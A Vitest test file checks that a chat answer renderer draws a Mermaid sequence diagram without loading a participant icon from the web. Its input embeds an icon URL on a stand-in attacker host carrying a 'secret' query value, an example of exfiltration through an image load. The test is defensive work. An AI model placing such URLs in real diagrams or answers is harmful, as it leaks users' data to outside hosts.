// @vitest-environment jsdom
import { expect, test, vi } from 'vitest'

const matrix = () => ({ a: 1, b: 0, c: 0, d: 1, e: 0, f: 0 })
Object.assign(SVGElement.prototype, {
  getBBox: () => ({ x: 0, y: 0, width: 10, height: 10 }),
  getComputedTextLength: () => 10,
  createSVGMatrix: matrix,
  getScreenCTM: matrix,
})

const fetched: string[] = []

new MutationObserver((records) => {
  for (const record of records) {
    for (const node of record.addedNodes) {
      if (!(node instanceof Element)) continue
      for (const one of [node, ...node.querySelectorAll('image')]) {
        if (one.localName !== 'image') continue
        const address = one.getAttribute('href') ?? one.getAttribute('xlink:href')
        if (address) fetched.push(address)
      }
    }
  }
}).observe(document, { childList: true, subtree: true })

const { answerHtml } = await import('./drawn')
const { drawing } = await import('../../chat-kit/src/api')

test('a sequence participant icon from the web loads nothing while an answer draws it', async () => {
  fetched.length = 0
  const before = drawing.version
  answerHtml(
    '```mermaid\nsequenceDiagram\n  participant A\n  properties A: {"icon": "https://evil.example/icon.png?secret=42"}\n  A->>B: hi\n```',
  )
  await vi.waitFor(() => {
    expect(drawing.version).toBeGreaterThan(before)
  })
  expect(fetched.filter((address) => address.includes('evil.example'))).toEqual([])
})
